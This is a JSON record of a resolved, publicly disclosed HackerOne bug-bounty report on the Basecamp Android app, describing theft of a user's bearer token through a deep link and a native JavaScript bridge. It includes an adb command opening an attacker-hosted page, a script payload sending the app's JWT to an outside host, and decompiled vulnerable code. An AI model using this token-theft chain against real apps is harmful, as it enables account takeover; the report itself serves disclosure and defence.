@@ -1,0 +1,154 @@
+{
+  "id": 1372667,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzcyNjY3",
+  "url": "https://hackerone.com/reports/1372667",
+  "title": "Able to steal bearer token from deep link",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-10-17T19:46:30.836Z",
+  "submitted_at": "2021-10-17T19:46:30.909Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "danielllewellyn",
+    "url": "/danielllewellyn",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 67,
+    "url": "https://hackerone.com/basecamp",
+    "handle": "basecamp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Basecamp",
+      "twitter_handle": "basecamp",
+      "website": "https://basecamp.com/about/policies/security/response",
+      "about": "Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Creators of the HEY email service."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-03-27T18:33:05.264Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-02-25T18:33:04.895Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Pre-requisities\n\nPrior to exploitation you would be required to know the \"account id\" of the user that you are attacking. Whilst this makes it difficult to attack an application in a generic way - the account is not secret information as it is included in any links to a user's basecamp organisation. E.g\n\nhttps://3.basecamp.com/5218370/\n\n# Attack\n\nThe attack involves forcing the user to enter the application either by starting an intent from an application on the device already, or by triggering a deep link (which can be done by with e.g. a phishing email) . The link should be in this format:\n\nhttps://3.basecamp.com/<accountId>/verify?proceed_to=<attacker controlled URL>\n\nHere is a sample adb command that can be used to test the attack:\n\n```sh\nadb shell am start -n com.basecamp.bc3/com.basecamp.bc3.activities.BasecampUrlFilterActivity https://3.basecamp.com/5218370/verify?proceed_to=https://haystack-production-storage.s3.eu-west-2.amazonaws.com/attack.html\n```\n\nThe second part of the attack involves redirecting someone using the turbo links API that is exposed through the javascript native bridge. Here is the example:\n\n```js\n<script>NativeApp.openNativeImageViewer(\"[{'download_url': 'https://us-central1-andro-3982e.cloudfunctions.net/home/5218370/image.jpg', 'preview_url': 'https://us-central1-andro-3982e.cloudfunctions.net/home/5218370/image.jpg', 'caption':'ViewImage'}]\", 0)</script>\n```\n\nThis script executes 'openNativeImageViewer' and passes the download_url and preview_url. The preview_url is the most interesting, as it requires not user interaction. In order to render a preview image, the basecamp app sends the JWT header to the site, meaning that the 'preview_url' will receive that header.\n\n# Vulnerability\n\nThe clearest vulnerability is that the check to determine if a URL is an 'internal' URL allows it to by bypassed in a limited way by using the /verify? url along with a proceed_to that is attacker controlled. \n\n```java\nif (TuroblinksUrlHandler.contains(url, \"/verify?\", true)) {\n                C3982h.nullCheck(url, \"$this$proceedToParam\");\n                C3982h.nullCheck(url, \"$this$extractQueryParam\");\n                C3982h.nullCheck(\"proceed_to\", \"queryKey\");\n                String queryParameter = url.toUri().getQueryParameter(\"proceed_to\");\n                url = queryParameter != null ? UrlKt.parseUrl(queryParameter) : null;\n                C3982h.nullCheck(url);\n            }\n\n Intent intent10 = new Intent(context, WebViewActivity.class);\n                    C1071a.addUrlsToIntent(url, intent10, \"intentUrl\", \"intentApiUrl\", null);\n                    return intent10;\n```\n\n## Impact\n\nAn attacker could, without physical access to the device, retrieve a user's authentication tokens. A potentially compounding factor is that once a user has been exploited, it might be possible to continue the chain of attack by having that compromised user share links with other users who trust links sent by the compromised user.",
+  "bounty_amount": "6337.0",
+  "formatted_bounty": "$6,337",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1484863,
+      "file_name": "attack.html",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/67zoapqgb32gvbcbzgtnwv7y2l0x?response-content-disposition=attachment%3B%20filename%3D%22attack.html%22%3B%20filename%2A%3DUTF-8%27%27attack.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZE5SLRL5%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T221758Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGytusGuUOs%2BXGE%2BmOnlE8GSUI8tHpAOyuZ7X1ZLgiUDAiEA06JbqoUcz3378vb9CcW%2FsKgn9EAZpUrMfr6%2B2lHhA5oquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDIr44srZhPCu%2BFbJkiqPBY8tFmcIht%2BNXO1%2Bke0nDdL6tT6Wl%2BXiZI%2B1elyIk0u8A4cqm0erRK0paKn6IZklfEkgu%2BMFrS2wgj%2FZtmiabPKlo%2BlLweGkyiBbGh7Qz0pvJmheQt6n8fZ4dS4CkFWEgEleSZfH%2B7TzhTn52LhDfelcmkRgJvVowl41QUmWWFCCiofh55rBmx92UCZTV27Iu1lx%2F%2BhWu3%2BgrVqUe513oF0GCg5Rs9srYolnuPN7kYqyohaQ08iUCP0yS0t2bGmpBRXjVjFAcKpnXZK1W75uNCIRbxvoblNaKNfDf4yb0DLsa9vzIAotbGrvxfiWkf1GjXF7757J3tb73ipovYZuCMtHt5EXXW3uCbr7re2DnK0%2BGM89znpsyQAJEoXNd8E6RZiLkRrKuPSREqYzXgVAcl2ixm9ptHDYXUyI3Edf9jTONZpqY6%2FXYj7uHhUlqNnJNM6lZpKQNH%2FGDJ5LfQxHDOV0wzskcJsu%2Bm8%2B2rYrBXzGouiYWlmtfGvJrPdH4ETPgn7Ssht6tK68Ux8VynJxk8zGliKXpdMqBs%2F3sf7mpY0SnmRJc7XwTzjnh4odLq%2BKuopahPXZjWC6c0mkSj3TPkuylnUol98vpFUCERBwrI6zP%2FQjpskAVbt8mTlo0pa3pL2PgBWFeClmftVoiwrXb8EIPVrAIPLXgbt3C6Rnk3PmxuNOsuuS6gIRxwZ0A65sAc4AWZ%2BKMq5jPWYjsgzOgSomcFthTDI4A3xJSE2V9kF4EO6LCAdR8nVW%2FvPteid3FqxEhWOCZ0h83ZYa9UWaPKLVKAR2M82dKNLAwgPY%2BAAzbsU4Q%2Fm%2FdVR%2BMOpEgwbT9Ndk%2ByrdrXlF5kSIFWraOl7NLX3x91hZt%2F6UulLohmYwlrXizAY6sQFiU5BItJkkZ1M718A3m16ova71gEURM1cKKI2Pb%2FnPRw85xUtp69rcqoG8d%2F1C9hT%2B2wILFvhC1BtVRr8FUcAUZUvJ9vsU07UQMKJ6DrUZkGHQiX7P2ht1aOYVu37nSZJUumb3vqTYG2Y2qGbO%2BnKggDXeIa2LRWdB3GsAqbyK33bfmOcJsEdGES6QiQYa3IzfFgwnJuhjCojhMLi4S%2B1hLvvfLHJC1VmKd46goOrZ%2F30%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5c59f5e8c2960e8384d5d675fafae2c5d950a38aedfe03df1868f919d9fe6d1f",
+      "file_size": 266,
+      "type": "text/html",
+      "moderated": null
+    },
+    {
+      "id": 1484864,
+      "file_name": "Screen_Recording_2021-10-17_at_20.28.23.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2p1q9cofjcv63tmsm41p96cy6tob?response-content-disposition=attachment%3B%20filename%3D%22Screen_Recording_2021-10-17_at_20.28.23.mov%22%3B%20filename%2A%3DUTF-8%27%27Screen_Recording_2021-10-17_at_20.28.23.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZE5SLRL5%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T221758Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGytusGuUOs%2BXGE%2BmOnlE8GSUI8tHpAOyuZ7X1ZLgiUDAiEA06JbqoUcz3378vb9CcW%2FsKgn9EAZpUrMfr6%2B2lHhA5oquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDIr44srZhPCu%2BFbJkiqPBY8tFmcIht%2BNXO1%2Bke0nDdL6tT6Wl%2BXiZI%2B1elyIk0u8A4cqm0erRK0paKn6IZklfEkgu%2BMFrS2wgj%2FZtmiabPKlo%2BlLweGkyiBbGh7Qz0pvJmheQt6n8fZ4dS4CkFWEgEleSZfH%2B7TzhTn52LhDfelcmkRgJvVowl41QUmWWFCCiofh55rBmx92UCZTV27Iu1lx%2F%2BhWu3%2BgrVqUe513oF0GCg5Rs9srYolnuPN7kYqyohaQ08iUCP0yS0t2bGmpBRXjVjFAcKpnXZK1W75uNCIRbxvoblNaKNfDf4yb0DLsa9vzIAotbGrvxfiWkf1GjXF7757J3tb73ipovYZuCMtHt5EXXW3uCbr7re2DnK0%2BGM89znpsyQAJEoXNd8E6RZiLkRrKuPSREqYzXgVAcl2ixm9ptHDYXUyI3Edf9jTONZpqY6%2FXYj7uHhUlqNnJNM6lZpKQNH%2FGDJ5LfQxHDOV0wzskcJsu%2Bm8%2B2rYrBXzGouiYWlmtfGvJrPdH4ETPgn7Ssht6tK68Ux8VynJxk8zGliKXpdMqBs%2F3sf7mpY0SnmRJc7XwTzjnh4odLq%2BKuopahPXZjWC6c0mkSj3TPkuylnUol98vpFUCERBwrI6zP%2FQjpskAVbt8mTlo0pa3pL2PgBWFeClmftVoiwrXb8EIPVrAIPLXgbt3C6Rnk3PmxuNOsuuS6gIRxwZ0A65sAc4AWZ%2BKMq5jPWYjsgzOgSomcFthTDI4A3xJSE2V9kF4EO6LCAdR8nVW%2FvPteid3FqxEhWOCZ0h83ZYa9UWaPKLVKAR2M82dKNLAwgPY%2BAAzbsU4Q%2Fm%2FdVR%2BMOpEgwbT9Ndk%2ByrdrXlF5kSIFWraOl7NLX3x91hZt%2F6UulLohmYwlrXizAY6sQFiU5BItJkkZ1M718A3m16ova71gEURM1cKKI2Pb%2FnPRw85xUtp69rcqoG8d%2F1C9hT%2B2wILFvhC1BtVRr8FUcAUZUvJ9vsU07UQMKJ6DrUZkGHQiX7P2ht1aOYVu37nSZJUumb3vqTYG2Y2qGbO%2BnKggDXeIa2LRWdB3GsAqbyK33bfmOcJsEdGES6QiQYa3IzfFgwnJuhjCojhMLi4S%2B1hLvvfLHJC1VmKd46goOrZ%2F30%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ff40f319f749a49d9dab2e2ad01009ebd28658b6a443834302be397cdcd6f140",
+      "file_size": 18468716,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2022-03-27T18:33:04.989Z",
+  "allow_singular_disclosure_after": -123219893.15551926,
+  "singular_disclosure_allowed": true,
+  "vote_count": 104,
+  "voters": [
+    "skyw1per",
+    "napoleon17",
+    "buraaqsec",
+    "mr-medi",
+    "dninjadave",
+    "taha_07",
+    "arist0phanes",
+    "n1m0",
+    "tolga",
+    "drsniper",
+    "and 94 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.7,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 4660,
+    "asset_type": "GOOGLE_PLAY_APP_ID",
+    "asset_identifier": "com.basecamp.bc3",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
